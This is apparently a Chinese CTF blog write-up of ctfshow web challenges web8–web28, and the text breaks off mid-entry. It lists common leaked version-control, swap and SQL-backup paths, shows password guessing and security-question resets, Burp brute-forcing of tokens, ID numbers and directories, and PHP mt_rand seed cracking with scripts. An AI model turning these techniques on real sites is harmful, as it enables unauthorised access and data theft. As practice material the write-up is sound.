<code>版本控制文件泄漏</code></p><p>题目提示信息还是：版本控制很重要，但不要部署到生产环境更重要。</p><p>考察svn代码泄漏，访问url/.svn/，获取到flag。</p><p><strong>版本控制文件泄漏总结：</strong></p><p>常见版本控制目录：</p><figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">http://target.com/.git/</span><br><span class="line">http://target.com/.svn/</span><br><span class="line">http://target.com/.hg/</span><br></pre></td></tr></tbody></table></figure><p>生产环境不应包含版本控制目录。</p><hr><h2 id="24-web9"><a href="#24-web9" class="headerlink" title="24 web9"></a>24 web9</h2><p>🚩 flag：<code>ctfshow{ce3903e3-2eaf-4dcf-8e4b-dcf1ccf424cf}</code></p><p>💡 hint： <code>vim缓存信息泄漏</code></p><p>题目提示信息：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p><p>根据题目提示得到vim缓存信息泄漏。</p><p>直接访问备份文件：</p><figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">http://target.com/.index.php.swp</span><br><span class="line">http://target.com/config.php~</span><br></pre></td></tr></tbody></table></figure><p>这里直接访问url/index.php.swp</p><p>获取到文件。将文件下载到本地后，删除.swp后缀后直接打开就可以获得flag。</p><hr><h2 id="25-web10"><a href="#25-web10" class="headerlink" title="25 web10"></a>25 web10</h2><p>🚩 flag：<code>ctfshow{9b7a980f-480a-4390-a583-746ee1f7c78a}</code></p><p>💡 hint： <code>cookie信息泄漏</code> <code>bp抓包</code></p><p>题目提示信息：cookie 只是一块饼干，不能存放任何隐私数据</p><p>根据题目提示信息得到cookie信息泄漏。</p><p>使用bp抓包。在重放器中看到信息。</p><p>![截屏2025-08-08 14.40.34](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 14.40.34.png)</p><p>url解码后得到flag：ctfshow{9b7a980f-480a-4390-a583-746ee1f7c78a}</p><hr><h2 id="26-web11"><a href="#26-web11" class="headerlink" title="26 web11"></a>26 web11</h2><p>🚩 flag：<code>ctfshow{9b7a980f-480a-4390-a583-746ee1f7c78a}</code></p><p>💡 hint： <code>域名信息隐藏</code></p><p>题目信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息</span><br></pre></td></tr></tbody></table></figure><p>由于动态更新，txt记录会变</p><p>最终flag flag{just_seesee}</p><p>通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p><p>查找flag.ctfshow.com域名下的txt记录</p><p>直接使用命令： nslookup -qt=txt flag.ctfshow.com</p><p><strong>总结：</strong>域名信息隐藏，使用nslookup。</p><hr><h2 id="27-web12"><a href="#27-web12" class="headerlink" title="27 web12"></a>27 web12</h2><p>🚩 flag：<code>ctfshow{e21c528d-4893-4153-bdce-5a04b2176ade}</code></p><p>💡 hint： <code>密码口令获取</code></p><p>题目信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></tbody></table></figure><p>打开是这样的页面。</p><p>![截屏2025-08-08 14.52.01](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 14.52.01.png)</p><p>通过题目知道我们需要找到管理员登录界面，以及密码。</p><p>使用robots.txt进行初步分析：</p><p>User-agent: *<br>Disallow: /admin/</p><p>使用<code>url/admin/</code>进行管理员登录</p><p>可能的密码：eflyer，372619038</p><p>经过尝试确认密码为372619038</p><p>![截屏2025-08-08 14.53.19](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 14.53.19.png)</p><p>登录后获取到flag ：ctfshow{e21c528d-4893-4153-bdce-5a04b2176ade}</p><hr><h2 id="28-web13"><a href="#28-web13" class="headerlink" title="28 web13"></a>28 web13</h2><p>🚩 flag：<code>ctfshow{dba3f7f5-4f7b-45b1-87f8-1de14d33730c}</code></p><p>💡 hint： <code>密码口令获取</code></p><p>题目信息：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p><p>根据题目提示<strong>技术文档</strong></p><p>在页面下面发现 document</p><p>下载发现里面存在后台地址和用户名密码登录成功获 得flag</p><p>![截屏2025-08-08 14.59.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 14.59.48.png)</p><p>![截屏2025-08-08 15.01.18](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 15.01.18.png)</p><p>使用<code>url/system1103/login.php</code>跳转到后台登录界面，然后使用用户名和密码进行登录。</p><hr><h2 id="29-web14"><a href="#29-web14" class="headerlink" title="29 web14"></a>29 web14</h2><p>🚩 flag：<code>ctfshow{6aeb7c7d-8b84-4d05-a626-45c311c48bd5}</code></p><p>💡 hint： <code>编辑器漏洞</code></p><p>题目提示信息：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人。</p><p>尝试了一下之前练习的获取源码的方法都失败了。提示信息一般很重要。</p><p>根据提示 泄露重要(editor)的信息 直接在url后面添加/editor</p><p>进入编辑器页面，在编辑器中点击附件上传，点击文件空间，查看到网页的所有文件。</p><p>![截屏2025-08-08 15.26.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 15.26.08.png)</p><p>这些是默认配置的目录，在服务器中不一定实际存在。当我们访问不存在的目录的时候，会跳转到服务器的根目录。</p><p>我们这里进入了服务器的根目录，先来查看一下浏览器目录。</p><p>/var/www/html</p><p>这里面有一个可疑的文件夹<code>nothinghere</code>，点击后查看到flag的路径。</p><p>因此这里访问<code>url/nothinghere/fl000g.txt</code>，获取到flag。</p><hr><h2 id="30-web15"><a href="#30-web15" class="headerlink" title="30 web15"></a>30 web15</h2><p>🚩 flag：<code>ctfshow{7b31fb56-8045-4f32-bb64-fc109ac2f3df}</code></p><p>💡 hint： <code>密码口令泄漏</code> <code>信息泄漏</code> <code>密码重置</code></p><p>题目信息：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p><p>根据提示，找到页面的公开信息邮箱：<a href="mailto:1156631961@qq.com">1156631961@qq.com</a></p><p>不知道管理员登录界面地址，使用robots.txt进行分析，没有结果。</p><p>根据之前的做题经验，尝试<code>url/admin/</code></p><p>成功进入后台登录系统。</p><p>使用账号admin，密码1156631961登录失败。尝试过许多密码都没有成功。</p><p>发现页面上有一个忘记密码按钮。需要回答地址问题。</p><p>通过qq添加好友功能，查看到目标是陕西西安。输入地址西安，密码被重置为admin7789，登录成功获取flag。</p><hr><h2 id="31-web16"><a href="#31-web16" class="headerlink" title="31 web16"></a>31 web16</h2><p>🚩 flag：<code>ctfshow{8dd1a4ff-32dc-4bcd-a786-296d199f55ba}</code></p><p>💡 hint： <code>PHP探针</code></p><p>题目信息：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><p>页面是一个很炫酷的3d元素周期表。</p><p>提示寻找测试用的探针，如何寻找？</p><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><p>![截屏2025-08-08 16.21.50](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 16.21.50.png)</p><p>点击<code>PHPINFO</code></p><p>在页面中搜索flag。</p><p>![截屏2025-08-08 16.26.25](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 16.26.25.png)</p><hr><h2 id="32-web17"><a href="#32-web17" class="headerlink" title="32 web17"></a>32 web17</h2><p>🚩 flag：<code>ctfshow{22d9351f-e8f7-4faa-be5d-b4fba021ca96}</code></p><p>💡 hint： <code>sql备份文件下载</code></p><p>题目信息：备份的sql文件会泄露敏感信息</p><p>备份的sql文件：backup.sql</p><p>![截屏2025-08-08 16.28.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 16.28.42.png)</p><p><strong>总结：</strong>🔍 常见备份SQL文件位置</p><ol><li>常规备份文件</li></ol><figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">/database.sql</span><br><span class="line">/db.sql</span><br><span class="line">/backup.sql</span><br><span class="line">/sql<span class="emphasis">_backup.sql</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>时间戳备份</li></ol><figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">/db<span class="emphasis">_20230815.sql</span></span><br><span class="line"><span class="emphasis">/backup_</span>2023.sql</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>压缩格式备份</li></ol><figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">/db.sql.gz</span><br><span class="line">/backup.sql.bz2</span><br><span class="line">/dump.sql.zip</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>开发临时备份</li></ol><figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">/db.sql.tmp</span><br><span class="line">/~database.sql</span><br><span class="line">/.sql<span class="emphasis">_backup.swp</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="33-web18"><a href="#33-web18" class="headerlink" title="33 web18"></a>33 web18</h2><p>🚩 flag：<code>ctfshow{9630ff84-7f6e-4bb9-b922-131c5965bd20}</code></p><p>💡 hint： <code>js代码审计</code></p><p>题目信息：不要着急，休息，休息一会儿，玩101分给你flag</p><p>查看js文件：</p><p>![截屏2025-08-08 16.34.14](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 16.34.14.png)</p><p>找到那一串unicode，在console中执行<code>alert("\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b")</code>进行解码。输出是这样的：</p><p>![截屏2025-08-08 16.40.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 16.40.08.png)</p><p>去<code>url/110.php</code>，得到flag。</p><hr><h2 id="34-web19"><a href="#34-web19" class="headerlink" title="34 web19"></a>34 web19</h2><p>🚩 flag：<code>ctfshow{2dfd99a3-d6d1-4b61-80cf-e10cda85a673}</code></p><p>💡 hint： <code>密码口令泄漏</code> <code>post重放 </code></p><p>题目信息：密钥什么的，就不要放在前端了</p><p>根据题目提示，检查页面源代码。</p><p>![截屏2025-08-08 16.44.57](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 16.44.57.png)</p><p>用户名以及加密后的密码写在注释里面了，使用post进行提交。</p><!--    error_reporting(0);    $flag="fakeflag"    $u = $_POST['username'];    $p = $_POST['pazzword'];    if(isset($u) && isset($p)){        if($u==='admin' && $p ==='a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04'){            echo $flag;        }}    --><p>直接在bp中编辑post。</p><p>![截屏2025-08-08 16.52.55](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 16.52.55.png)</p><p>通过，得到flag。</p><hr><h2 id="35-web20"><a href="#35-web20" class="headerlink" title="35 web20"></a>35 web20</h2><p>🚩 flag：<code>flag{ctfshow_old_database}</code></p><p>💡 hint：  <code>数据库源码泄漏</code></p><p>题目信息：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件</p><p>使用cyberchef提取strings，然后搜索flag：</p><p>flag{ctfshow_old_database}</p><hr><h2 id="36-web21"><a href="#36-web21" class="headerlink" title="36 web21"></a>36 web21</h2><p>🚩 flag：<code>ctfshow{0df31ed9-c8ea-492f-9e05-a517f03177d3}</code></p><p>💡 hint：  <code>暴力破解</code> <code>tomcat 认证爆破之custom iterator</code></p><p>题目信息：爆破什么的，都是基操</p><p>抓包之后，像这样配置burpsuite。</p><p>![截屏2025-08-08 17.50.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 17.50.08.png)</p><p>然后在options界面，减少等待，并且添加flag格式。</p><p>![截屏2025-08-08 17.53.41](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 17.53.41.png)</p><p>其他的不需要再设置了。</p><p>然后开始爆破。</p><p>找到返回值为200的，查看respond：</p><p>ctfshow{0df31ed9-c8ea-492f-9e05-a517f03177d3}</p><p>![截屏2025-08-08 18.02.09](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 18.02.09.png)</p><hr><h2 id="37-web22"><a href="#37-web22" class="headerlink" title="37 web22"></a>37 web22</h2><p>🚩 flag：<code>flag{ctf_show_web}</code></p><p>💡 hint：  <code>暴力破解</code> <code>域名爆破</code></p><p>域名暴力破解在线工具：<a href="http://phpinfo.me/domain/">http://phpinfo.me/domain/</a></p><hr><h2 id="38-web23"><a href="#38-web23" class="headerlink" title="38 web23"></a>38 web23</h2><p>🚩 flag：<code>ctfshow{a337ed0c-6554-43fa-b413-da4997737dd6}</code></p><p>💡 hint：  <code>暴力破解</code> <code>代码审计</code></p><p>题目信息：还爆破？这么多代码，告辞！</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'token'</span>])){</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">'token'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>)){</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>))){</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>直接写python脚本跑：</p><p>找到一个满足条件的即可，这里取数字解，1～10000先爆破。</p><p>找到一个422。</p><p>![截屏2025-08-08 18.47.04](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 18.47.04.png)</p><p>使用?token=422得到ctfshow{a337ed0c-6554-43fa-b413-da4997737dd6}</p><hr><h2 id="39-web24"><a href="#39-web24" class="headerlink" title="39 web24"></a>39 web24</h2><p>🚩 flag：<code>ctfshow{ead0af30-2c95-4654-9d2e-9d55a44f81cf}</code></p><p>💡 hint：  <code>暴力破解</code> <code>代码审计</code></p><p>题目信息：爆个🔨</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'r'</span>])){</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">'r'</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>())){</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">'cat /proc/version'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">163</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">067</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">2</span>)) <span class="comment">#180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023</span></span><br></pre></td></tr></tbody></table></figure><p>运行代码即可：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>得到：<code>1155388967</code></p><p>提交，得到flag。</p><hr><h2 id="40-web25"><a href="#40-web25" class="headerlink" title="40 web25"></a>40 web25</h2><p>🚩 flag：<code>ctfshow{219cec6c-855e-4831-baf4-eae3fcc0a267}</code></p><p>💡 hint：  <code>暴力破解</code> <code>代码审计</code></p><p>题目信息：爆个🔨，不爆了</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'r'</span>])){</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">'r'</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>)){</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">'token'</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>())){</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">'cat /proc/version'</span>);</span><br><span class="line">}</span><br><span class="line">Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">163</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">067</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">2</span>)) <span class="comment">#180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023</span></span><br></pre></td></tr></tbody></table></figure><p>代码分析：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'r'</span>])){</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">'r'</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>))); <span class="comment">// 种子基于flag的MD5前8位</span></span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>)){ <span class="comment">// 要求$r等于第一个随机数</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">'token'</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>())){ <span class="comment">// token等于接下来两个随机数之和</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先，取r=0，得到第一个随机数。输出-1182775281，故第一个随机数为<code>1182775281</code></p><p>得到这个随机数之后，还需要一个名为token的cookie。</p><p>这里需要使用接下来的两个随机数。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./php_mt_seed 1182775281</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-08 21.14.23](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 21.14.23.png)</p><p>使用随机数4079228096进行计算。</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">4079228096</span>); <span class="comment">// 此处的这个数，来自上面PHP 7.1.0+那行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'intval(mt_rand())='</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token2</span> = <span class="title function_ invoke__">mt_rand</span>() + <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'mt_rand()+mt_rand()='</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>输出结果为：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>())=<span class="number">1182775281</span></span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()=<span class="number">1300647519</span></span><br></pre></td></tr></tbody></table></figure><p>最后，使用cookie：token=1300647519，以及url/?r=1182775281</p><hr><h2 id="41-web26"><a href="#41-web26" class="headerlink" title="41 web26"></a>41 web26</h2><p>🚩 flag：<code>ctfshow{f5d00fa6-dec2-457d-bc0f-cfef6d347e62}</code></p><p>💡 hint：  <code>暴力破解</code> <code>代码审计</code></p><p>题目信息：这个可以爆</p><p>进入到登录页面，直接抓包，不填写任何信息，提交，即可看到flag。</p><p>![截屏2025-08-08 21.21.21](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 21.21.21.png)</p><hr><h2 id="42-web27"><a href="#42-web27" class="headerlink" title="42 web27"></a>42 web27</h2><p>🚩 flag：<code>ctfshow{9629ab21-c625-4c54-9d51-84d925141c19}</code></p><p>💡 hint：  <code>暴力破解</code></p><p>题目信息：CTFshow菜鸡学院招生啦！</p><p>先研究这个页面，尝试尽可能多的获取有用信息。</p><p>这里获取到CTFshow菜鸡学院录取名单，以及一个学院录取查询页面。</p><p>录取名单信息如下：</p><table><thead><tr><th>CTFshow菜鸡学院录取名单</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td>序号</td><td>姓名</td><td>专业</td><td>身份证号码</td><td>备注</td></tr><tr><td>1</td><td>高先伊</td><td>WEB</td><td>621022********5237</td><td></td></tr><tr><td>2</td><td>嵇开梦</td><td>MISC</td><td>360730********7653</td><td>党员</td></tr><tr><td>3</td><td>郎康焕</td><td>RE</td><td>522601********8092</td><td></td></tr><tr><td>4</td><td>元羿谆</td><td>PWN</td><td>451023********3419</td><td>生源地贷款</td></tr><tr><td>5</td><td>祁落兴</td><td>CRYPTO</td><td>410927********5570</td><td></td></tr></tbody></table><p>没有中间八位数字（出生年月日）。这里还是使用burpsuite进行爆破。</p><p>![截屏2025-08-08 21.42.33](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 21.42.33.png)</p><p>![截屏2025-08-08 21.42.55](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 21.42.55.png)</p><p>开始攻击：</p><p>按照长度排序，找到正确的结果：<code>621022199002015237</code></p><p>![截屏2025-08-08 21.43.33](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 21.43.33.png)</p><p>使用该姓名和身份证号登录：</p><p>获得弹窗信息：</p><blockquote><p>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</p></blockquote><p>学号：02015237</p><p>身份证号：621022199002015237</p><blockquote><p>恭喜您，登陆成功!ctfshow{9629ab21-c625-4c54-9d51-84d925141c19}</p></blockquote><hr><h2 id="43-web28"><a href="#43-web28" class="headerlink" title="43 web28"></a>43 web28</h2><p>🚩 flag：<code>ctfshow{ced204ff-9771-4f72-b917-e6243ebdccc5}</code></p><p>💡 hint：  <code>暴力破解</code> <code>目录爆破</code></p><p>题目信息：大海捞针</p><p>看看url, 输入/0/0,/0/1发现都是403,不给访问。那么就知道让你爆破目录了，那么大概的范围呢？</p><p>10* 10太小，估计就是100* 100了</p><p>这里还是使用burp suite，注意使用的攻击类型。</p><p>![截屏2025-08-08 22.00.23](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 